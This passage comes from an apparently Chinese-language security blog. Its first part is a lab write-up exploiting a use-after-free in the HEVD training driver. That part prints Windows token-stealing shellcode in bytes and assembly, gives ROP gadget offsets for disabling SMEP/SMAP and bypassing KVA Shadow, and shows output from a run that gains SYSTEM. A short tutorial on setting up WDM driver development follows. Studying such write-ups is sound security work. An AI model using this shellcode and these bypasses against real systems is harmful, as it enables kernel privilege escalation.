<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x22201F</span>:</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">	FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">AllocateFakeObjectNonPagedPoolIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">	v7 = <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> LABEL_64;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">AllocateFakeObjectNonPagedPoolIoctlHandler</span><span class="params">(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _NAMED_PIPE_CREATE_PARAMETERS *Parameters; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  Parameters = IrpSp-&gt;Parameters.CreatePipe.Parameters;</span><br><span class="line">  result = <span class="number">0xC0000001</span>;</span><br><span class="line">  <span class="keyword">if</span> ( Parameters )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">AllocateFakeObjectNonPagedPool</span>((_FAKE_OBJECT_NON_PAGED_POOL *)Parameters);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">AllocateFakeObjectNonPagedPool</span><span class="params">(_FAKE_OBJECT_NON_PAGED_POOL *UserFakeObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _OWORD *PoolWithTag; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Creating Fake Object\n&quot;</span>);</span><br><span class="line">  PoolWithTag = <span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPool, <span class="number">0x5C</span>ui64, <span class="number">0x6B636148</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( PoolWithTag )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="string">&quot;&#x27;kcaH&#x27;&quot;</span>);</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Type: %s\n&quot;</span>, <span class="string">&quot;NonPagedPool&quot;</span>);</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Size: 0x%zX\n&quot;</span>, <span class="number">0x5C</span>ui64);</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, PoolWithTag);</span><br><span class="line">    <span class="built_in">ProbeForRead</span>(UserFakeObject, <span class="number">0x5C</span>ui64, <span class="number">1u</span>);</span><br><span class="line">    *PoolWithTag = *(_OWORD *)UserFakeObject-&gt;Buffer;</span><br><span class="line">    PoolWithTag[<span class="number">1</span>] = *(_OWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">16</span>];</span><br><span class="line">    PoolWithTag[<span class="number">2</span>] = *(_OWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">32</span>];</span><br><span class="line">    PoolWithTag[<span class="number">3</span>] = *(_OWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">48</span>];</span><br><span class="line">    PoolWithTag[<span class="number">4</span>] = *(_OWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">64</span>];</span><br><span class="line">    *((_QWORD *)PoolWithTag + <span class="number">10</span>) = *(_QWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">80</span>];</span><br><span class="line">    *((_DWORD *)PoolWithTag + <span class="number">22</span>) = *(_DWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">88</span>];</span><br><span class="line">    *((_BYTE *)PoolWithTag + <span class="number">91</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Fake Object: 0x%p\n&quot;</span>, PoolWithTag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[-] Unable to allocate Pool chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3221225495</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打两个断点，成功写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3: kd&gt; dq 0xFFFFA78BF933D540</span><br><span class="line">ffffa78b`f933d540  00000000`deadbeef 00000000`00000000</span><br><span class="line">ffffa78b`f933d550  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d560  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d570  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d580  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d590  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d5a0  6b636148`02070000 00000000`00000000</span><br><span class="line">ffffa78b`f933d5b0  00000000`deadbeef 00000000`00000000</span><br></pre></td></tr></table></figure>

<h4 id="shellcode-1"><a href="#shellcode-1" class="headerlink" title="shellcode"></a>shellcode</h4><p>使用keystone生成汇编</p>
<p>或者参考<a href="https://github.com/vportal/HEVD/blob/main/HEVD_UAF_WIN10_21H2.cpp">HEVD&#x2F;HEVD_UAF_WIN10_21H2.cpp</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&#123; <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>, <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xC3</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x9B</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x81</span>, <span class="number">0xEB</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x8B</span>, <span class="number">0x40</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xF9</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xE5</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x8B</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x80</span>, <span class="number">0xE1</span>, <span class="number">0xF0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0xC3</span> &#125;</span><br><span class="line"><span class="comment">// 反汇编</span></span><br><span class="line"><span class="number">0</span>:  <span class="number">65</span> <span class="number">48</span> <span class="number">8b</span> <span class="number">04</span> <span class="number">25</span> <span class="number">88</span> <span class="number">01</span>    mov    rax,QWORD PTR gs:<span class="number">0x188</span>  </span><br><span class="line"><span class="number">7</span>:  <span class="number">00</span> <span class="number">00</span>  </span><br><span class="line"><span class="number">9</span>:  <span class="number">48</span> <span class="number">8b</span> <span class="number">80</span> b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    rax,QWORD PTR [rax+<span class="number">0xb8</span>]  </span><br><span class="line"><span class="number">10</span>: <span class="number">48</span> <span class="number">89</span> c3                mov    rbx,rax  </span><br><span class="line"><span class="number">13</span>: <span class="number">48</span> <span class="number">8b</span> <span class="number">9b</span> <span class="number">48</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>    mov    rbx,QWORD PTR [rbx+<span class="number">0x448</span>]  </span><br><span class="line"><span class="number">1</span>a: <span class="number">48</span> <span class="number">81</span> eb <span class="number">48</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>    sub    rbx,<span class="number">0x448</span>  </span><br><span class="line"><span class="number">21</span>: <span class="number">48</span> <span class="number">8b</span> <span class="number">8b</span> <span class="number">40</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>    mov    rcx,QWORD PTR [rbx+<span class="number">0x440</span>]  </span><br><span class="line"><span class="number">28</span>: <span class="number">48</span> <span class="number">83</span> f9 <span class="number">04</span>             cmp    rcx,<span class="number">0x4</span>  </span><br><span class="line"><span class="number">2</span>c: <span class="number">75</span> e5                   jne    <span class="number">0x13</span>  </span><br><span class="line"><span class="number">2</span>e: <span class="number">48</span> <span class="number">8b</span> <span class="number">8b</span> b8 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>    mov    rcx,QWORD PTR [rbx+<span class="number">0x4b8</span>]</span><br><span class="line"><span class="number">35</span>: <span class="number">80</span> e1 f0                <span class="keyword">and</span>    cl,<span class="number">0xf0</span>  </span><br><span class="line"><span class="number">38</span>: <span class="number">48</span> <span class="number">89</span> <span class="number">88</span> b8 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>    mov    QWORD PTR [rax+<span class="number">0x4b8</span>],rcx  </span><br><span class="line"><span class="number">3f</span>: <span class="number">48</span> <span class="number">31</span> c0                <span class="keyword">xor</span>    rax,rax  </span><br><span class="line"><span class="number">42</span>: c3                      ret</span><br></pre></td></tr></table></figure>

<p>是写成功了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3: kd&gt; dq 0xFFFFDC04FE779850</span><br><span class="line">ffffdc04`fe779850  00018825`048b4865 000000b8`808b4800</span><br><span class="line">ffffdc04`fe779860  04489b8b`48c38948 000448eb`81480000</span><br><span class="line">ffffdc04`fe779870  00000440`8b8b4800 8b48e575`04f98348</span><br><span class="line">ffffdc04`fe779880  f0e18000`0004b88b 48000004`b8888948</span><br><span class="line">ffffdc04`fe779890  00000000`00c3c031 00007ff7`85ad32d8</span><br><span class="line">ffffdc04`fe7798a0  00000000`00000000 00000000`00413f2e</span><br><span class="line">ffffdc04`fe7798b0  6b636148`02070000 61005400`00000000</span><br><span class="line">ffffdc04`fe7798c0  00018825`048b4865 000000b8`808b4800</span><br></pre></td></tr></table></figure>

<p>但是直接写无法运行，无法提权：保护机制的绕过。</p>
<h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>bypass KASLR: 获取内核基址 <code>ntoskrnl.exe</code> 地址：遍历驱动，获取内核基址<br>bypass SEMP&#x2F;SMAP: 修改CR4寄存器，将20，21位置0<br>bypass KVA Sahdow: 内核页表隔离KVA(KPTI)，也就是<a href="https://alvinovo.top/post/memory-page-table-isolation/#3-1-KVA-Shadow">KVA Shadow</a>，当执行内核代码时，用户态代码记录为 <code>NX</code></p>
<ul>
<li>AllocPoolWithTag 获得的内存一般是可执行的，因此可以往内存中写，然后执行</li>
<li>执行<code>swapgs</code>绕过，和Linux Kernel类似</li>
</ul>
<p>如果CR4寄存器的第20位被设置为1，那么就启用了SMEP；21位smap <a href="https://www.cnblogs.com/HcyRcer/p/16559321.html">Cr0-Cr4</a>。这里看到smep，smap都存在。SMEP存在就可以执行用户态代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2: kd&gt; r cr4</span><br><span class="line">cr4=0000000000350ef8</span><br><span class="line">2: kd&gt; .formats cr4</span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     00000000`00350ef8</span><br><span class="line">  Decimal: 3477240</span><br><span class="line">  Decimal (unsigned) : 3477240</span><br><span class="line">  Octal:   0000000000000015207370</span><br><span class="line">  Binary:  00000000 00000000 00000000 00000000 00000000 00110101 00001110 11111000</span><br><span class="line">  Chars:   .....5..</span><br><span class="line">  Time:    Tue Feb 10 13:54:00 1970</span><br><span class="line">  Float:   low 4.87265e-039 high 0</span><br><span class="line">  Double:  1.71798e-317</span><br></pre></td></tr></table></figure>

<p>寻找ROP：仍然使用ropper&#x2F;ROPgadget工具，在 <code>ntoskrnl.exe</code> 寻找</p>
<ul>
<li><code>C:\Windows\WinSxS\amd64_microsoft-windows-os-kernelxxx\ntoskrnl.exe</code></li>
</ul>
<p>寻找gadget</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">(ntoskrnl.exe/PE/x86_64)&gt; imagebase <span class="number">0</span>x0</span><br><span class="line">[INFO] Imagebase <span class="built_in">set</span> to <span class="number">0</span>x0</span><br><span class="line"></span><br><span class="line">(ntoskrnl.exe/PE/x86_64)&gt; search mov cr4, r</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span>x0000000000a1d523: mov cr4, rax; ret;</span><br><span class="line"><span class="number">0</span>x00000000003a0a87: mov cr4, rcx; ret;</span><br><span class="line"></span><br><span class="line">(ntoskrnl.exe/PE/x86_64)&gt; search pop rcx; ret</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span>x00000000002148c8: pop rcx; ret;</span><br><span class="line"></span><br><span class="line">(ntoskrnl.exe/PE/x86_64)&gt; search mov esp,</span><br><span class="line">...</span><br><span class="line">// 找 <span class="number">0</span>x1000 的倍数</span><br><span class="line"><span class="number">0</span>x00000000002f3f90: mov esp, <span class="number">0</span>x48000000; add esp, <span class="number">0</span>x28; ret;</span><br><span class="line"></span><br><span class="line">(ntoskrnl.exe/PE/x86_64)&gt; search swapgs</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span>x0000000000a18c22: swapgs; iretq; ret;</span><br><span class="line"><span class="number">0</span>x000000000041272f: swapgs; sysretq; ret;</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://vulndev.io/2022/07/02/windows-kernel-exploitation-hevd-x64-stackoverflow/">Windows Kernel Exploitation x64 Stack Overflow </a>为了不崩溃，shellcode需要添加bypass KVA Shadow。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">[BITS <span class="number">64</span>]</span><br><span class="line">start:</span><br><span class="line">  mov rax, [gs:<span class="number">0x188</span>]       ; KPCRB.<span class="built_in">CurrentThread</span> (_KTHREAD)</span><br><span class="line">  mov rax, [rax + <span class="number">0xb8</span>]     ; APCState.<span class="built_in">Process</span> (current _EPROCESS)</span><br><span class="line">  mov r8, rax               ; Store current _EPROCESS ptr in RBX</span><br><span class="line"> </span><br><span class="line">loop:</span><br><span class="line">  mov r8, [r8 + <span class="number">0x448</span>]      ; ActiveProcessLinks</span><br><span class="line">  sub r8, <span class="number">0x448</span>             ; Go back to start of _EPROCESS</span><br><span class="line">  mov r9, [r8 + <span class="number">0x440</span>]      ; <span class="built_in">UniqueProcessId</span> (PID)</span><br><span class="line">  cmp r9, <span class="number">4</span>                 ; SYSTEM PID? </span><br><span class="line">  jnz loop                  ; Loop until PID == <span class="number">4</span></span><br><span class="line"> </span><br><span class="line">replace:</span><br><span class="line">  mov rcx, [r8 + <span class="number">0x4b8</span>]      ; Get SYSTEM token</span><br><span class="line">  <span class="keyword">and</span> cl, <span class="number">0xf0</span>               ; Clear low <span class="number">4</span> bits of _EX_FAST_REF structure</span><br><span class="line">  mov [rax + <span class="number">0x4b8</span>], rcx     ; Copy SYSTEM token to current process</span><br><span class="line"> </span><br><span class="line">cleanup:</span><br><span class="line">  mov rax, [gs:<span class="number">0x188</span>]       ; _KPCR.Prcb.CurrentThread</span><br><span class="line">  mov cx, [rax + <span class="number">0x1e4</span>]     ; KTHREAD.KernelApcDisable</span><br><span class="line">  inc cx</span><br><span class="line">  mov [rax + <span class="number">0x1e4</span>], cx</span><br><span class="line">  mov rdx, [rax + <span class="number">0x90</span>]     ; ETHREAD.TrapFrame</span><br><span class="line">  mov rcx, [rdx + <span class="number">0x168</span>]    ; ETHREAD.TrapFrame.Rip</span><br><span class="line">  mov r11, [rdx + <span class="number">0x178</span>]    ; ETHREAD.TrapFrame.EFlags</span><br><span class="line">  mov rsp, [rdx + <span class="number">0x180</span>]    ; ETHREAD.TrapFrame.Rsp</span><br><span class="line">  mov rbp, [rdx + <span class="number">0x158</span>]    ; ETHREAD.TrapFrame.Rbp</span><br><span class="line">  <span class="keyword">xor</span> eax, eax  ;</span><br><span class="line">  swapgs</span><br><span class="line">  o64 sysret </span><br></pre></td></tr></table></figure>

<p>某个地址读写，断点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; ba e1 &lt;ObjectAddr&gt;</span><br></pre></td></tr></table></figure>

<p>最终结果</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">debugger</span>&gt;<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">debugger</span>\<span class="title">Desktop</span>\<span class="title">HEVDExploit.exe</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Spray</span> <span class="title">use</span> <span class="title">write</span> <span class="title">pipe</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Create</span> <span class="title">UAF</span> <span class="title">Object</span> <span class="title">then</span> <span class="title">free</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Prepare</span> <span class="title">shellcode</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Spray</span> <span class="title">to</span> <span class="title">get</span> <span class="title">the</span> <span class="title">UAF</span> <span class="title">object</span> <span class="title">then</span> <span class="title">write</span> <span class="title">shellcode</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Trigger</span> <span class="title">UAF</span> <span class="title">callback</span></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Windows</span> [版本 10.0.19045.3930]</span></span><br><span class="line"><span class="function">(<span class="title">c</span>) <span class="title">Microsoft</span> <span class="title">Corporation</span>。保留所有权利。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">debugger</span>&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">nt</span> <span class="title">authority</span>\<span class="title">system</span></span></span><br></pre></td></tr></table></figure>

<p>感觉是一个小tip: VirtalAlloc 第一次shellcode可执行，可以跳转执行。第二次为内核申请栈空间，并且不允许换出内存，ROP关闭SMEP就可以执行shellcode。”taking a user-mode page and marking it as a kernel page”</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">LPVOID pShellcode = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(pShellcode, StealToken, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">LPVOID pKernelStack = <span class="built_in">VirtualAlloc</span>((LPVOID)stackAddr, <span class="number">0x14000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">VirtualLock</span>(pKernelStack, <span class="number">0x14000</span>)) &#123;</span><br><span class="line">	<span class="built_in">Error</span>(<span class="string">&quot;VirtualLock&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p>Windows 无法验证此设备所需的驱动程序的数字签名。某软件或硬件最近有所更改，可能安装了签名错误或损毁的文件，或者安装的文件可能是来路不明的恶意软件。</p>
<ul>
<li>更新与安全-&gt;恢复-&gt;高级启动-&gt;立刻重新启动-&gt;疑难解答-&gt;高级选项-&gt;禁用驱动强制签名（F7</li>
</ul>
<h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>翻到了一篇CVE分析，其中利用到了token替换技术：<a href="https://bbs.kanxue.com/thread-277554.htm">CVE-2022-37969 漏洞利用</a>,一个优秀的利用对象：pipe</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreatePipe</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PHANDLE               hReadPipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PHANDLE               hWritePipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPSECURITY_ATTRIBUTES lpPipeAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD                 nSize</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>会在内核空间创建 <code>PipeAttribute</code>，PipeAttribute结构是在<code>PagedPool</code>中分配的内核空间中属性的表示，构造后可以造成任意地址的读写</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">PipeAttribute</span> &#123;</span><br><span class="line">    LIST_ENTRY list ;</span><br><span class="line">    <span class="type">char</span> * AttributeName;</span><br><span class="line">    <span class="type">uint64_t</span> AttributeValueSize;</span><br><span class="line">    <span class="type">char</span> * AttributeValue;</span><br><span class="line">    <span class="type">char</span> data [<span class="number">0</span>];</span><br><span class="line"> &#125;;</span><br><span class="line">  <span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> &#123;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Flink;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Blink;</span><br><span class="line"> &#125; LIST_ENTRY, *PLIST_ENTRY, PRLIST_ENTRY;</span><br></pre></td></tr></table></figure>

<p>因此可以不写汇编而达到steal token 的目的</p>
<ul>
<li>使用适当的参数调用<code>NtQuerySystemInformation</code> API获取当前进程和拥有SYSTEM特权的System进程（PID 4）的_EPROCESS和_TOKEN</li>
<li>调用OpenProcessToken函数打开与当前进程关联的访问令牌</li>
<li>根据漏洞替换token</li>
</ul>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://mdanilor.github.io/posts/">Posts (mdanilor.github.io)</a></li>
<li><a href="https://paper.seebug.org/1743/">Scoop the Windows 10 pool !</a></li>
<li><a href="https://bbs.kanxue.com/thread-276550.htm">win提权漏洞文章收集</a></li>
<li><a href="https://xz.aliyun.com/t/13434?time__1311=mqmxnDBQqQq2D/D0Dx2DUrzLtg0D7uP+D&alichlgref=https://xz.aliyun.com/">Windows内核利用小总结</a></li>
<li><a href="https://www.alex-ionescu.com/?p=231">Sheep Year Kernel Heap Fengshui</a></li>
<li><a href="https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/">Sheep Year Kernel Heap Fengshui: Spraying in the Big Kids’ Pool</a></li>
</ul>
]]></content>
      <categories>
        <category>HEVD</category>
      </categories>
      <tags>
        <tag>HEVD</tag>
      </tags>
  </entry>
  <entry>
    <title>WDM</title>
    <url>/2024/01/27/WDM/</url>
    <content><![CDATA[<blockquote>
<p>Window Driver Module</p>
</blockquote>
<span id="more"></span>
<h2 id="WDK"><a href="#WDK" class="headerlink" title="WDK"></a>WDK</h2><p>VS中没有找到单个组件的这些选项，因此使用官方的方法下载，单独下载sdk和wdk</p>
<ul>
<li><a href="https://blog.csdn.net/qq_44240304/article/details/127549383">window10+vs2022配置window驱动开发环境</a></li>
<li><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/download-the-wdk">下载 Windows 驱动程序工具包 (WDK) - Windows drivers</a></li>
</ul>
<p>然后会有一个 <code>VSIX Installer</code>，下载好之后，我们的VS就可以开发了</p>
<p>新建项目，应该可以看到 <code>Driver</code> 选项</p>
<p>或者使用Windows提供的虚拟机 <a href="https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/">Windows VM</a></p>
<h2 id="驱动开发"><a href="#驱动开发" class="headerlink" title="驱动开发"></a>驱动开发</h2><p>windows驱动分两类，NT式驱动和WDM驱动，后者支持即插即用；</p>
<p>因此选择 <code>WDM(Windows Driver Model)</code>， 提供一个驱动入口 <code>DriverEntry</code> 和 驱动卸载 <code>DriverOnload</code> 函数。需要注意C++ 的名称粉碎机制</p>
<p>右键，属性，Driver Setting</p>
<ul>
<li>target OS 在VS2022 + win11 已经不能成功生成win7版本</li>
<li>target paltform:<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/develop/target-platforms">驱动程序参考页上的“目标平台”</a></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">DbgPrint</span>(<span class="string">&quot;Unload Module Demo\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RigisterEntry)</span> </span>&#123;</span><br><span class="line">	DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="built_in">DbgPrint</span>(<span class="string">&quot;Load Module Demo\r\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>官方案例不像 helloworld 的样子。<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/writing-your-first-driver">制作你的第一个驱动程序 </a></p>
<ul>
<li>KMDF是由微软提供的一个高级抽象层，它建立在WDM（Windows Driver Model）之上，并提供了一些额外的功能和简化驱动程序开发的接口。KMDF旨在使驱动程序开发人员能够更轻松地编写和维护可靠的内核模式驱动程序。</li>
</ul>
<h3 id="驱动安装"><a href="#驱动安装" class="headerlink" title="驱动安装"></a>驱动安装</h3><p>OSRDriverLoader: <a href="https://www.osronline.com/article.cfm%5earticle=157.htm">Downloads:Driver Loader (osronline.com)</a></p>
<ul>
<li>w2k: windows 2000</li>
<li>WLH: windows vista</li>
<li>WNET: windows 7 及以上。使用里面的 <code>AMD64 OSRLOADER</code></li>
<li>WXP: windows XP</li>
</ul>
<h3 id="DEbug"><a href="#DEbug" class="headerlink" title="DEbug"></a>DEbug</h3><p><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/debugview">DebugView - Sysinternals</a>: 它可以显示 DbgPrint 打印出来的log</p>
<p>WinDbg: 需要设置一下,<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/debug-universal-drivers---step-by-step-lab--echo-kernel-mode-">回显内核模式调试 Windows 驱动 - Windows drivers</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 调试器中显示来自目标系统的所有调试消息</span></span><br><span class="line">ed nt!Kd_DEFAULT_MASK 0xFFFFFFFF</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有调试信息有点多，打印调试字符串</span></span><br><span class="line">ed nt!Kd_Default_Mask 8</span><br></pre></td></tr></table></figure>

<h3 id="R0-与-R3-通信"><a href="#R0-与-R3-通信" class="headerlink" title="R0 与 R3 通信"></a>R0 与 R3 通信</h3><p>驱动程序的主要功能也就是负责处理IO请求，其中大部分IO请求是在派遣函数中处理的。</p>
<h4 id="R0"><a href="#R0" class="headerlink" title="R0"></a>R0</h4><p>创建设备对象：使用IoCreateDevice必须管理员才能打开 而使用IoCreateDeviceSecure 则可以普通权限打开</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoCreateDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           PDRIVER_OBJECT  DriverObject,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG           DeviceExtensionSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PUNICODE_STRING DeviceName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DEVICE_TYPE     DeviceType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG           DeviceCharacteristics,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           BOOLEAN         Exclusive,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PDEVICE_OBJECT  *DeviceObject</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>设备名：符号链接</p>
